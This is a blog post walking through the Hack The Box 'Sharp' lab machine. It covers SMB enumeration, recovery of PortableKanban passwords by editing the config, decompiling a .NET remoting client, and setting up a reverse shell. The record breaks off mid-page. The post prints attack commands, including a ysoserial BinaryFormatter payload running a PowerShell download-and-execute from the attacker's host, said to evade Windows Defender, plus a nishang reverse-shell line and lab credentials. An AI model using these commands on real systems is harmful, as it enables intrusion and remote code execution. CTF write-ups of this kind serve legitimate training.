<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Hackthebox Sharp walkthrough" /><meta property="og:locale" content="en" /><meta name="description" content="Security blog contains writeup for hackthebox machines and publications." /><meta property="og:description" content="Security blog contains writeup for hackthebox machines and publications." /><link rel="canonical" href="https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" /><meta property="og:url" content="https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/" /><meta property="og:site_name" content="m19o" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-26T01:50:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Sharp walkthrough" /><meta name="twitter:site" content="@m19o__" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Security blog contains writeup for hackthebox machines and publications.","url":"https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/","@type":"BlogPosting","headline":"Hackthebox Sharp walkthrough","dateModified":"2021-11-26T02:03:40+00:00","datePublished":"2021-11-26T01:50:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://m19o.github.io/posts/HackTheBox-Sharp-Walkthrough/"},"@context":"https://schema.org"}</script><title>Hackthebox Sharp walkthrough | m19o</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="m19o"><meta name="application-name" content="m19o"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/71312369?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">m19o</a></div><div class="site-subtitle font-italic">Security Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/m19o" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/m19o__" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['MohamedMagdyAbuMuslim','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Sharp walkthrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Sharp walkthrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Magdy Abumuslim </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 26, 2021, 1:50 AM +0000" >Nov 26, 2021<i class="unloaded">2021-11-26T01:50:00+00:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 26, 2021, 4:03 AM +0200" >Nov 26, 2021<i class="unloaded">2021-11-26T02:03:40+00:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1611 words">8 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="https://i.ibb.co/47wNjmZ/Eo-Ud-Yp-BWMAwn3-Z2.jpg" alt="Eo-Ud-Yp-BWMAwn3-Z2" /></p><h1>Methodology</h1><h3>1- Scanning</h3><h3>2- SMB Enumertion</h3><h3>3- Kanban Analysis</h3><h3>4- Config Manipulation</h3><h3>5- Exploit Remote Service</h3><h3>6- WCF Exploitation</h3><h1>Scanning</h1><pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.219</span></span><br /><span class="line">PORT     STATE SERVICE         VERSION</span><br /><span class="line">135/tcp  open  tcpwrapped</span><br /><span class="line">139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn</span><br /><span class="line">445/tcp  open  microsoft-ds?</span><br /><span class="line">5985/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br /><span class="line">8888/tcp open  sun-answerbook?</span><br /><span class="line">8889/tcp open  ddi-tcp-2?</span><br /><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br /></pre><h1>SMB Enumeration</h1><p>When you see SMB in Windows enviroment you should go for it !</p><p>Let's start enumerating</p><h1>SMB Enumeration</h1><pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219</span></span><br /><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br /><span class="line">        Disk                                                    Permissions     Comment</span><br /><span class="line">        ----                                                    -----------     -------</span><br /><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br /><span class="line">        C$                                                      NO ACCESS       Default share</span><br /><span class="line">        dev                                                     NO ACCESS</span><br /><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br /><span class="line">        kanban                                                  READ ONLY</span><br /></pre><p>It looks like that we can read Kanban directory only, so let's see what we can get</p><pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># smbmap -H 10.10.10.219 -R</span></span><br /><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br /><span class="line">        Disk                                                    Permissions     Comment</span><br /><span class="line">        ----                                                    -----------     -------</span><br /><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br /><span class="line">        C$                                                      NO ACCESS       Default share</span><br /><span class="line">        dev                                                     NO ACCESS</span><br /><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br /><span class="line">        kanban                                                  READ ONLY</span><br /><span class="line">        .\kanban\*</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br /><span class="line">        fr--r--r--            58368 Sat Nov 14 13:57:04 2020    CommandLine.dll</span><br /><span class="line">        fr--r--r--           141312 Sat Nov 14 13:57:04 2020    CsvHelper.dll</span><br /><span class="line">        fr--r--r--           456704 Sat Nov 14 13:57:04 2020    DotNetZip.dll</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:59 2020    Files</span><br /><span class="line">        fr--r--r--            23040 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Converter.Html.dll</span><br /><span class="line">        fr--r--r--            75776 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Interpreter.dll</span><br /><span class="line">        fr--r--r--            32768 Sat Nov 14 13:57:04 2020    Itenso.Rtf.Parser.dll</span><br /><span class="line">        fr--r--r--            19968 Sat Nov 14 13:57:04 2020    Itenso.Sys.dll</span><br /><span class="line">        fr--r--r--           376832 Sat Nov 14 13:57:04 2020    MsgReader.dll</span><br /><span class="line">        fr--r--r--           133296 Sat Nov 14 13:57:04 2020    Ookii.Dialogs.dll</span><br /><span class="line">        fr--r--r--          2558011 Sat Nov 14 13:57:04 2020    pkb.zip</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    Plugins</span><br /><span class="line">        fr--r--r--             5819 Sat Nov 14 13:57:04 2020    PortableKanban.cfg</span><br /><span class="line">        fr--r--r--           118184 Sat Nov 14 13:57:04 2020    PortableKanban.Data.dll</span><br /><span class="line">        fr--r--r--          1878440 Sat Nov 14 13:57:04 2020    PortableKanban.exe</span><br /><span class="line">        fr--r--r--            31144 Sat Nov 14 13:57:04 2020    PortableKanban.Extensions.dll</span><br /><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3</span><br /><span class="line">        fr--r--r--             2080 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.bak</span><br /><span class="line">        fr--r--r--               34 Sat Nov 14 13:57:04 2020    PortableKanban.pk3.md5</span><br /><span class="line">        fr--r--r--           413184 Sat Nov 14 13:57:04 2020    ServiceStack.Common.dll</span><br /><span class="line">        fr--r--r--           137216 Sat Nov 14 13:57:04 2020    ServiceStack.Interfaces.dll</span><br /><span class="line">        fr--r--r--           292352 Sat Nov 14 13:57:04 2020    ServiceStack.Redis.dll</span><br /><span class="line">        fr--r--r--           411648 Sat Nov 14 13:57:04 2020    ServiceStack.Text.dll</span><br /><span class="line">        fr--r--r--          1050092 Sat Nov 14 13:57:04 2020    User Guide.pdf</span><br /><span class="line">        .\kanban\Plugins\*</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    .</span><br /><span class="line">        dr--r--r--                0 Sat Nov 14 13:57:04 2020    ..</span><br /></pre><p>We need now to get the files on our machine to analyze it to see if we can get any useful information</p><pre><span class="line">smbget -R smb://10.10.10.219/kanban</span><br /></pre><h1>Kanban Analysis</h1><p>After downloading all the files in Kanban directory, I used ack to search for passwords in the files</p><pre><span class="line">apt-get install ack</span><br /><span class="line"></span><br /><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># ack -i "password"</span></span><br /><span class="line">PortableKanban.pk3</span><br /><span class="line">1:{<span class="string">"Columns"</span>:[{<span class="string">"Id"</span>:<span class="string">"4757781032fd41b2a4511822e2c08850"</span>,<span class="string">"SortOrder"</span>:0,<span class="string">"Name"</span>:<span class="string">"Demo"</span>,<span class="string">"Limit"</span>:0,<span class="string">"TaskOrder"</span>:{<span class="string">"SortType"</span>:<span class="string">"None"</span>,<span class="string">"Parameters"</span>:[{<span class="string">"Field"</span>:<span class="string">"Completed"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Descending"</span>},{<span class="string">"Field"</span>:<span class="string">"Deadline"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>},{<span class="string">"Field"</span>:<span class="string">"Priority"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Descending"</span>},{<span class="string">"Field"</span>:<span class="string">"Topic"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>},{<span class="string">"Field"</span>:<span class="string">"Person"</span>,<span class="string">"SortOrder"</span>:<span class="string">"Ascending"</span>}]},<span class="string">"AutoComplete"</span>:<span class="literal">false</span>,<span class="string">"ResetCompleted"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769443121006}],<span class="string">"Tasks"</span>:[{<span class="string">"Id"</span>:<span class="string">"33870d6dfe4146718ba0b2c9f7bc05cf"</span>,<span class="string">"SeriesId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"SortOrder"</span>:<span class="string">"oGdBKcFw"</span>,<span class="string">"ColumnId"</span>:<span class="string">"4757781032fd41b2a4511822e2c08850"</span>,<span class="string">"TopicId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"PersonId"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Text"</span>:<span class="string">"New Task"</span>,<span class="string">"Priority"</span>:<span class="string">"Low"</span>,<span class="string">"Created"</span>:<span class="string">"\/Date(1605380100000+0100)\/"</span>,<span class="string">"CreatedBy"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"Modified"</span>:<span class="string">"\/Date(-62135596800000)\/"</span>,<span class="string">"ModifiedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Deadline"</span>:<span class="string">"\/Date(1605308400000+0100)\/"</span>,<span class="string">"HasDeadline"</span>:<span class="literal">false</span>,<span class="string">"Completed"</span>:<span class="string">"\/Date(1605308400000+0100)\/"</span>,<span class="string">"CompletedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"Done"</span>:<span class="literal">false</span>,<span class="string">"Canceled"</span>:<span class="literal">false</span>,<span class="string">"Link"</span>:<span class="string">""</span>,<span class="string">"Subtasks"</span>:[],<span class="string">"Tags"</span>:[],<span class="string">"Estimate"</span>:0,<span class="string">"Progress"</span>:0,<span class="string">"Points"</span>:0,<span class="string">"Comments"</span>:[],<span class="string">"CustomFields"</span>:{},<span class="string">"TimeStamp"</span>:637409769542424146}],<span class="string">"TimeTracks"</span>:[],<span class="string">"Persons"</span>:[],<span class="string">"Topics"</span>:[],<span class="string">"Tags"</span>:[],<span class="string">"Views"</span>:[],<span class="string">"Users"</span>:[{<span class="string">"Id"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"Name"</span>:<span class="string">"Administrator"</span>,<span class="string">"Initials"</span>:<span class="string">""</span>,<span class="string">"Email"</span>:<span class="string">""</span>,<span class="string">"EncryptedPassword"</span>:<span class="string">"k+iUoOvQYG98PuhhRC7/rg=="</span>,<span class="string">"Role"</span>:<span class="string">"Admin"</span>,<span class="string">"Inactive"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769245503731},{<span class="string">"Id"</span>:<span class="string">"0628ae1de5234b81ae65c246dd2b4a21"</span>,<span class="string">"Name"</span>:<span class="string">"lars"</span>,<span class="string">"Initials"</span>:<span class="string">""</span>,<span class="string">"Email"</span>:<span class="string">""</span>,<span class="string">"EncryptedPassword"</span>:<span class="string">"Ua3LyPFM175GN8D3+tqwLA=="</span>,<span class="string">"Role"</span>:<span class="string">"User"</span>,<span class="string">"Inactive"</span>:<span class="literal">false</span>,<span class="string">"TimeStamp"</span>:637409769265925613}],<span class="string">"ServiceMessages"</span>:[],<span class="string">"CustomFieldDescriptors"</span>:[],<span class="string">"MetaData"</span>:{<span class="string">"Id"</span>:<span class="string">"ffffffffffffffffffffffffffffffff"</span>,<span class="string">"SchemaVersion"</span>:<span class="string">"4.2.0.0"</span>,<span class="string">"SchemaVersionModified"</span>:<span class="string">"\/Date(1605380100000+0100)\/"</span>,<span class="string">"SchemaVersionModifiedBy"</span>:<span class="string">"e8e29158d70d44b1a1ba4949d52790a0"</span>,<span class="string">"SchemaVersionChecked"</span>:<span class="string">"\/Date(-62135596800000-0000)\/"</span>,<span class="string">"SchemaVersionCheckedBy"</span>:<span class="string">"00000000000000000000000000000000"</span>,<span class="string">"TimeStamp"</span>:637409769001918463}}</span><br /></pre><p>Ack found creds in PortableKanban.pk3</p><pre><span class="line">Administrator</span><br /><span class="line">ID: e8e29158d70d44b1a1ba4949d52790a0</span><br /><span class="line">Encrypted Password: <span class="string">"k+iUoOvQYG98PuhhRC7/rg=="</span></span><br /><span class="line"></span><br /><span class="line">Lars</span><br /><span class="line">ID: 0628ae1de5234b81ae65c246dd2b4a21</span><br /><span class="line">Encrypted Password: <span class="string">"Ua3LyPFM175GN8D3+tqwLA=="</span></span><br /></pre><p>I needed to read Kanban user guide to know how the porgram works</p><p>Page 1: The program is portable so we can edit the config but it will be our responsibility if something happened</p><p>Page 3: Password can be blank but you shouldn't use it like that</p><p>Page 11: Administrator is the default account and the password is blank</p><p>Page 18: If your forgot the password take executable file to another directorty and run it as admin</p><p>Page 22: Passwords in setup/users tab</p><p>After reading the guide, now to need to run the exe file on another directory to restore the passwords</p><p>From now you should use windows VM, In my case iam using dual boot so i countinued with windows</p><p>When i ran it as admin it says that the files has been successfully recoverd</p><p>So i tried to sign in as administrator since it's the default user and that's the only user we know</p><p><img data-proofer-ignore data-src="https://i.ibb.co/p0DLhCf/htb139.jpg" alt="htb139" border="0" /></p><h1>Config Manipulation</h1><p>I can't log in, So since it's a portable software let's take a look at the configuration</p><p><img data-proofer-ignore data-src="https://i.ibb.co/3STVZxd/htb140.jpg" alt="htb140" border="0" /></p><p>It's looks like when the application load it takes an encrypted password for the administrator</p><p>As i mentioned earlier we can use a blank password, So now let's remove the password and try to log in</p><p><img data-proofer-ignore data-src="https://i.ibb.co/ggf8S9c/htb141.jpg" alt="htb141" border="0" /></p><p>BAM ! we logged in</p><p><img data-proofer-ignore data-src="https://i.ibb.co/Tgcbvnc/htb142.jpg" alt="htb142" border="0" /></p><p>Now let's go to Setup/users tab to get the passwords</p><p><img data-proofer-ignore data-src="https://i.ibb.co/BfYFmVT/htb143.jpg" alt="htb143" border="0" /></p><p>You need to uncheck the hide password box to get it</p><p>So we got Lars:G123HHrth234gRG</p><pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219</span></span><br /><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br /><span class="line">        Disk                                                    Permissions     Comment</span><br /><span class="line">        ----                                                    -----------     -------</span><br /><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br /><span class="line">        C$                                                      NO ACCESS       Default share</span><br /><span class="line">        dev                                                     READ ONLY</span><br /><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br /><span class="line">        kanban                                                  NO ACCESS</span><br /></pre><p>As you see we have permissions on another 2 directories, Let's list all the files</p><pre><span class="line">┌──(m19o@pwning)-[~/m19o/HTB/sharp]</span><br /><span class="line">└─<span class="comment"># smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219 -R</span></span><br /><span class="line">[+] IP: 10.10.10.219:445        Name: localhost                                         </span><br /><span class="line">        Disk                                                    Permissions     Comment</span><br /><span class="line">        ----                                                    -----------     -------</span><br /><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br /><span class="line">        C$                                                      NO ACCESS       Default share</span><br /><span class="line">        dev                                                     READ ONLY</span><br /><span class="line">        .\dev\*</span><br /><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    .</span><br /><span class="line">        dr--r--r--                0 Sun Nov 15 06:30:13 2020    ..</span><br /><span class="line">        fr--r--r--             5632 Sun Nov 15 05:25:01 2020    Client.exe</span><br /><span class="line">        fr--r--r--               70 Sun Nov 15 08:59:02 2020    notes.txt</span><br /><span class="line">        fr--r--r--             4096 Sun Nov 15 05:25:01 2020    RemotingLibrary.dll</span><br /><span class="line">        fr--r--r--             6144 Mon Nov 16 06:55:44 2020    Server.exe</span><br /><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br /><span class="line">        .\IPC$\*</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br /><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-364-0</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e4-0</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-190-0</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br /><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-428-0</span><br /><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br /><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-254-0</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-274-0</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br /><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132546763363573536.2940.DefaultAppDomain.wsmprovhost</span><br /><span class="line">        kanban                                                  NO ACCESS</span><br /></pre><p>That's a lot of files, let's get download them on our machine</p><pre><span class="line">smbget -R smb://10.10.10.219/dev/ -U lars%G123HHrth234gRG</span><br /></pre><h1>Exploit Remote Service</h1><p>We have now to exe files so we need to De-Compile them and analyze them</p><p>I used Dnspy https://github.com/dnSpy/dnSpy</p><p>So i opened Client.exe</p><p><img data-proofer-ignore data-src="https://i.ibb.co/0G0vGdj/2021-05-01-21-43-58.png" alt="2021-05-01-21-43-58" border="0" /></p><p>You can see RemoteSample right ?, Let's see what it contains.</p><p><img data-proofer-ignore data-src="https://i.ibb.co/WPf3BSz/2021-05-01-21-44-29.png" alt="2021-05-01-21-44-29" border="0" /></p><p>It's connecting to port 8888 and there's creds as you can see</p><p><img data-proofer-ignore data-src="https://i.ibb.co/k0G1Qdv/2021-05-01-21-44-56.png" alt="2021-05-01-21-44-56" border="0" /></p><h1>User</h1><p>I searched for .NET remote service exploit and found : <a href="https://github.com/tyranid/ExploitRemotingService">ExploitRemotingService</a></p><h1>Creating the reverse shell on Windows</h1><p>1- Download python for windows to start HTTP server to host the reverse shell file</p><p>2- Download compiled Nc.exe to get the reverse shell connection</p><p>3- Use nishang reverse shell and add this line [Invoke-PowerShellTcp -Reverse -IPAddress [Your IP] -Port [Your listner port]] at the end of the file to download our hosted reverse shell file</p><p>4- Download Ysoserial to serialize our payload to bypass windows defender</p><pre><span class="line">ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c <span class="string">"powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')"</span></span><br /></pre><p>After serializing</p><pre><span 